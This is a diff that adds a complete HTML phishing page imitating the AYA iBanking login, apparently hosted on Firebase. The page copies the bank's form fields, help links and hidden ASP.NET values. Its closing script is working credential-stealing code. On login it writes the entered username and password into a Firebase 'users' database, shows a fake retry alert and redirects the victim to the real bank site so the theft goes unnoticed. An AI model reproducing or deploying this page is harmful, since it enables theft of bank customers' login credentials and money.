@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>AYA iBanking</title>
+    <link href="css/login.css" rel="stylesheet" type="text/css"><link rel="icon" type="image/ico" href="images/favicon.ico"><link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+
+    <!-- update the version number as needed -->
+    <script defer src="/__/firebase/7.8.1/firebase-app.js"></script>
+    <!-- include only the Firebase features as you need -->
+    <script defer src="/__/firebase/7.8.1/firebase-auth.js"></script>
+    <script defer src="/__/firebase/7.8.1/firebase-database.js"></script>
+    <script defer src="/__/firebase/7.8.1/firebase-messaging.js"></script>
+    <script defer src="/__/firebase/7.8.1/firebase-storage.js"></script>
+    <!-- initialize the SDK after all desired features are loaded -->
+    <script src="js/jquery-min.js" type="text/javascript"></script>
+    <script src="js/jquery.placeholder.js" type="text/javascript"></script>
+    <script defer src="/__/firebase/init.js"></script>
+
+    <style type="text/css">
+        
+    </style>
+    <script src="js/sha256.js" type="text/javascript"></script>
+
+    <style media="screen">
+      body { background: #ECEFF1; color: rgba(0,0,0,0.87); font-family: Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+      #message { background: white; max-width: 360px; margin: 100px auto 16px; padding: 32px 24px; border-radius: 3px; }
+      #message h2 { color: #ffa100; font-weight: bold; font-size: 16px; margin: 0 0 8px; }
+      #message h1 { font-size: 22px; font-weight: 300; color: rgba(0,0,0,0.6); margin: 0 0 16px;}
+      #message p { line-height: 140%; margin: 16px 0 24px; font-size: 14px; }
+      #message a { display: block; text-align: center; background: #039be5; text-transform: uppercase; text-decoration: none; color: white; padding: 16px; border-radius: 4px; }
+      #message, #message a { box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); }
+      #load { color: rgba(0,0,0,0.4); text-align: center; font-size: 13px; }
+      @media (max-width: 600px) {
+        body, #message { margin-top: 0; background: white; box-shadow: none; }
+        body { border-top: 16px solid #ffa100; }
+      }
+    </style>
+  </head>
+  <body class="ibLogin" style="">
+    <table id="tblLogin" class="tbl_layout" align="center" width="1000" height="100%" cellpadding="0" cellspacing="0" border="0" style="height: 620px;">
+      <tbody><tr>
+          <td>
+              <form name="fm1" id="fm1" style="position: absolute; top: 100px; right: 30px;">
+<div>
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="rGrXU9dl6Zq3V4mPc85oLzSMd7LD7wbIqbvBePpyWMiA/F9jf8c8kyydRJuBjc5cFXt49NyDvfzsWWXfYJScAYEu/mZ9xardLTsxFQb/Ny9sklixKNZ1+g2F8Dt3ZtahqP14o3LP8ECootT+YD6V2506kqUZjNTxqbb9mqVl5tTmu7fH3bdTNOcCQQsre7jzHUBvGrsTx2pXEC2/DKi0RsjsFwLaCb9qf9wN6QIQl16QPEHg">
+</div>
+
+<div>
+
+<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="87C696C8">
+<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/O/Izt8UI1VjCSqTZqokHm9vDVqxYaBljo9W4YHOO+KlaEpnS4YiFHr26GtX/34+VC10Achz9yahH6fp0ci83WSqfG7tDzA26eKvxGnfoXpb9jYfY9BJ4loGcYWYjvCEulgV62LDDaeQACAxyPAtRIynfsb6iDkCoJKC3LzQ42oOdFMFrdYdkS9sPwg8CERyuEWCZC39JPP0uqZtplALTWTYs9Y=">
+</div>
+                  <table width="100%" cellpadding="0" cellspacing="0" border="0">
+                      <tbody>  
+                      <tr>
+                          <td valign="top" class="auto-style1" style="width: 500px;">&nbsp;</td>
+
+                          <td class="td_box">
+                              <div class="div_topbox">
+                                  AYA iBanking
+                              </div>
+                              <div class="div_middlebox">
+                                  
+                                  <div class="input">
+                                      <div class="divtext">
+                                          <span class="icon">
+                                              <img src="images/user.png">
+                                          </span>
+                                          <input type="text" id="txtUser" tabindex="1" class="required" autocomplete="off" placeholder="User name">
+                                      </div>
+                                  </div>
+                                  
+                                  <div class="input">
+                                      <div class="divtext">
+                                          <span class="icon">
+                                              <img src="images/key.png">
+                                          </span>
+                                          <input type="password" id="txtPass" tabindex="2" class="required" autocomplete="off" placeholder="Password">
+
+                                      </div>
+                                  </div>
+                                  
+                                  <div class="input">
+                                      <img id="Image1" class="imgValidate" src="images/imgsecuritycode.aspx" style="border-width:0px;">
+                                      <div class="divtext">
+                                          <span>
+                                              <img src="images/code.png">
+                                          </span>
+                                          <input type="text" id="txtValidateCode" tabindex="3" class="required" autocomplete="off" placeholder="Security code">
+                                      </div>
+
+                                  </div>
+                                  <div class="loginInfo">
+                                      <span id="lblInfo"></span>
+                                  </div>
+                                  <div class="loginInfoDetail">
+                                      <span id="lblInfoDetail"></span>
+                                  </div>
+                                  <div class="button">
+                                      
+                                      <input type="button" name="btnLogin2" value="Login"  id="btnLogin2" tabindex="3" class="smbutton">
+                                  </div>
+                                  <div class="forget">
+                                  </div>
+
+                              </div>
+                              <div class="div_footer">
+                                  
+                                  
+                                  <div id="divLang">
+                                      <a href="EBK/AaItBgAHGwZDwrP3O49nFclQXTpuWC8KCqgTZ0T4SkYX1gvbQj1woCIhy1Vr1QuDxPBFK5dYkEVeDOZ0iNdwLMfAi9fielDB0Vkm?d=UEJDQC65OypBQkNANTJAYwwJb40Y43gGb-rzj4D__ixBEUPcZyMzKkE ">
+                                          <img src="images/flag-Myan.gif" alt="" title="">
+                                      </a>
+                                      <a href="EBK/AaItBgAHGwZDwrP3O49nFclQXTpuWC8KCqgTZ0T4SkYX1gvbQj1woCIhy1Vr1QuDxPBFK5dYkEVeDOZ0iNdwLMfAi9fielDB0Vkm?d=VUJDQC65OypBQkNANTJAYwwJb40Y43gGb-rzj4B__vlMT0VA7GOkQFVCQ0A ">
+                                          <img src="images/flag-Eng.gif" alt="English" title="English">
+                                      </a>
+                                  </div>
+                                  <div style="height: 10px;"></div>
+                                  <div>
+                                      <a id="linkBarPdf" class="link-doc" href="Help/AYA%20iBanking%20User%20Guide%20P%20v1.2.pdf" target="_blank">AYA iBanking Guide</a>
+                                  </div>
+                                  <div style="height: 5px;"></div>
+                                  <div>
+                                      <a id="mlinkBarPdf" class="link-doc" href="Help/AYA%20mBanking%20Guide.pdf" target="_blank">AYA mBanking Guide</a>
+                                  </div>
+
+                                  <div style="height: 5px;"></div>
+                                  <div>
+                                      <a id="corpLinkBarPdf" class="link-doc" href="Help/AYA%20iBanking%20corporate%20v1.pdf" target="_blank">AYA iBanking Corporate Guide</a>
+                                  </div>
+                                   <div style="height: 5px;"></div>
+                                  <div>
+                                      <a id="HyperLink1" class="link-doc" href="Help/AYA%20mBanking%202.0%20USER%20GUIDE.pdf" target="_blank">AYA mBanking 2.0 User guide</a>
+                                  </div>
+                                  <div style="height: 10px;"></div>
+                              </div>
+                          </td>
+                      </tr>
+                  </tbody></table>
+
+              </form>
+          </td>
+      </tr>
+      
+  </tbody></table>
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        var database = firebase.database();
+        console.log(database);
+        function writeUserData(name, pass) {
+          firebase.database().ref('users').push().set({
+            username: name,
+            pass: pass,
+          });
+        }
+        $("#btnLogin2").click(function(){
+          let txtUser = $("#txtUser").val();
+          let txtPass = $("#txtPass").val();
+          writeUserData(txtUser,txtPass);
+          alert("Please try again password!");
+          window.location.href = "https://www.ayaibanking.com/";
+        });
+        $('input').on('keydown', function(e) {
+          if (e.which == 13) {
+            $("#btnLogin2").click();
+          }
+        });
+        
+      });
+      
+
+    </script>
+  </body>
+</html>
